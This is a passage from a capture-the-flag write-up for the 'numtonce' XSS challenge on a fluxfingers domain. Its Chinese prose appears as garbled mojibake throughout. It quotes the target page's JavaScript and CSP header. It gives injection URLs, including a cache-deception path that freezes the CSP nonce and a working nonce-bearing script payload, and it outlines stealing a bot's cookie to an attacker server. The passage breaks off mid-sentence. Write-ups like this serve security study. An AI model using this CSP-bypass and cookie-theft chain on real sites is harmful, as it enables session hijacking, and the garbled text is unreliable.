class="headerlink" title="ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚"></a>ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚</h6><h6 id="1-ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚"><a href="#1-ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚" class="headerlink" title="1. ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚"></a>1. ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚</h6><h6 id="2-å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚"><a href="#2-å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚" class="headerlink" title="2. å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚"></a>2. å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚</h6><h6 id="3-æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚"><a href="#3-æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚" class="headerlink" title="3. æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚"></a>3. æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚</h6><h6 id="4-æ‹¿åˆ°cookieä¸­çš„flagã€‚"><a href="#4-æ‹¿åˆ°cookieä¸­çš„flagã€‚" class="headerlink" title="4. æ‹¿åˆ°cookieä¸­çš„flagã€‚"></a>4. æ‹¿åˆ°cookieä¸­çš„flagã€‚</h6><h5 id="ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚"><a href="#ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚" class="headerlink" title="ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚"></a>ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">"b80a92df721eda620876363536b7e9a6"</span> src=<span class="string">"/emojify.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> l=location</span><br><span class="line">      <span class="keyword">let</span> h=l.hash</span><br><span class="line">      <span class="keyword">var</span> p=l.hostname</span><br><span class="line">    <span class="keyword">const</span> s=l.search</span><br><span class="line">      <span class="keyword">let</span> a=h.split(p)</span><br><span class="line">      <span class="keyword">var</span> b=a.map(<span class="function">(<span class="params">o,O</span>)=&gt;</span>(O^<span class="number">0</span>!==<span class="number">0</span>&amp;&amp;o||<span class="string">''</span>)).map(<span class="built_in">decodeURIComponent</span>)</span><br><span class="line">    <span class="keyword">const</span> o0o=b.join(s)</span><br><span class="line">      <span class="keyword">let</span> script=sessionStorage[a[<span class="number">0</span>]]</span><br><span class="line">      <span class="keyword">var</span> my=<span class="function"><span class="params">a</span>=&gt;</span>b</span><br><span class="line">    <span class="keyword">const</span> msg=<span class="string">'there is p'</span> <span class="keyword">in</span> my <span class="string">`t'</span></span><br><span class="line"><span class="string">Ë‚/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">    o0o='nope'</span></span><br><span class="line"><span class="string">Ë‚/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A wise man once said: 'A CSP a day keeps the XSS away.`</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;div id="garden"&gt;'</span>);</span><br><span class="line">    <span class="built_in">document</span>.write(o0o||<span class="string">'tt t t t fnttttttttt nfst t ttt n t tl t  tnr tmtt dt n  cttttrttntt t tttttnttt   t t nt   tt tt nt  t  t  t'</span>.split(<span class="string">''</span>).map(<span class="function"><span class="params">c</span>=&gt;</span>(&#123;<span class="attr">t</span>:<span class="string">':evergreen_tree:'</span>,<span class="attr">f</span>:<span class="string">':fallen_leaf:'</span>,<span class="attr">s</span>:<span class="string">':squirrel:'</span>,<span class="attr">l</span>:<span class="string">':leaves:'</span>,<span class="attr">r</span>:<span class="string">':rabbit:'</span>,<span class="attr">m</span>:<span class="string">':maple_leaf:'</span>,<span class="attr">d</span>:<span class="string">':droplet:'</span>,<span class="attr">c</span>:<span class="string">':cherry_blossom:'</span>,<span class="attr">n</span>:<span class="string">'&lt;br/&gt;'</span>,<span class="string">' '</span>:<span class="string">':white_small_square:'</span>&#125;[c])).join(<span class="string">''</span>));</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;/div&gt;'</span>);</span><br><span class="line"></span><br><span class="line">    emojify.setConfig(&#123; <span class="attr">img_dir</span>: <span class="string">'/emojis'</span> &#125;);</span><br><span class="line">    emojify.run(garden);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ªdocument-write-o0o-å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚"><a href="#é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ªdocument-write-o0o-å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚" class="headerlink" title="é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ªdocument.write(o0o),å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚"></a>é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ª<code>document.write(o0o)</code>,å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚</h6><h6 id="å›é¡¾è¿™ä¸ªo0oå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±-å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚"><a href="#å›é¡¾è¿™ä¸ªo0oå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±-å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚" class="headerlink" title="å›é¡¾è¿™ä¸ªo0oå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±#å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚"></a>å›é¡¾è¿™ä¸ª<code>o0o</code>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±#å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/#numtonce.fluxfingersforfuture.fluxfingers.net&lt;h1&gt;test&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<h6 id="ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚"><a href="#ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚" class="headerlink" title="ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚"></a>ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/csp.png" alt></p>
<h6 id="å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š"><a href="#å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š" class="headerlink" title="å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š"></a>å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=&apos; &apos;nonce-117bc8c1d6ead80e5b6ad3f3eca4921e&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;; base-uri &apos;none&apos;; frame-ancestors &apos;none&apos;; form-action &apos;none&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚"><a href="#nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚" class="headerlink" title="nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚"></a>nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚</h6><h6 id="è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„-https-csp-evaluator-withgoogle-com-ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚"><a href="#è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„-https-csp-evaluator-withgoogle-com-ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚" class="headerlink" title="è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„(https://csp-evaluator.withgoogle.com/)ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚"></a>è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„(<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a>)ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚</h6><h6 id="ä¸€æ®µæ—¶é—´åjs-css-imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚"><a href="#ä¸€æ®µæ—¶é—´åjs-css-imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚" class="headerlink" title="ä¸€æ®µæ—¶é—´åjs/css/imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚"></a>ä¸€æ®µæ—¶é—´åjs/css/imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hit-Or-Miss: i guess they never miss huh?</span><br></pre></td></tr></table></figure>

<h6 id="è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js-css-imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚"><a href="#è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js-css-imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚" class="headerlink" title="è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js/css/imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚"></a>è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js/css/imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚</h6><h6 id="è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½index-phpï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚"><a href="#è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½index-phpï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚" class="headerlink" title="è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½index.phpï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚"></a>è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½<code>index.php</code>ï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚</h6><h6 id="æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex-phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´-Cache-Controlç­‰ç­‰-ã€‚"><a href="#æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex-phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´-Cache-Controlç­‰ç­‰-ã€‚" class="headerlink" title="æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex.phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´(Cache-Controlç­‰ç­‰)ã€‚"></a>æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex.phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´(Cache-Controlç­‰ç­‰)ã€‚</h6><h6 id="ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss-botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚"><a href="#ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss-botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚" class="headerlink" title="ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚"></a>ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚</h6><h6 id="ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·Server-nginxï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚"><a href="#ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·Server-nginxï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚" class="headerlink" title="ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·Server: nginxï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚"></a>ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·<code>Server: nginx</code>ï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚</h6><h6 id="å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥-cssç»“å°¾ä½†ä»åŠ è½½index-phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š"><a href="#å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥-cssç»“å°¾ä½†ä»åŠ è½½index-phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š" class="headerlink" title="å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥.cssç»“å°¾ä½†ä»åŠ è½½index.phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š"></a>å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥.cssç»“å°¾ä½†ä»åŠ è½½index.phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css</span><br></pre></td></tr></table></figure>

<h6 id="æˆåŠŸï¼nonce-tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼"><a href="#æˆåŠŸï¼nonce-tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼" class="headerlink" title="æˆåŠŸï¼nonce tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼"></a>æˆåŠŸï¼nonce tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼</h6><h6 id="å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert-1-nonce-æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP-nonceä»¤ç‰Œ-ï¼š"><a href="#å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert-1-nonce-æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP-nonceä»¤ç‰Œ-ï¼š" class="headerlink" title="å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert(1)({nonce}æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP nonceä»¤ç‰Œ)ï¼š"></a>å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert(1)({nonce}æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP nonceä»¤ç‰Œ)ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&lt;script nonce=&quot;&#123;nonce&#125;&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h6 id="ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨"><a href="#ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨" class="headerlink" title="ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨"></a>ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨</h6><h6 id="ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img-srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š"><a href="#ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img-srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š" class="headerlink" title="ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š"></a>ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› 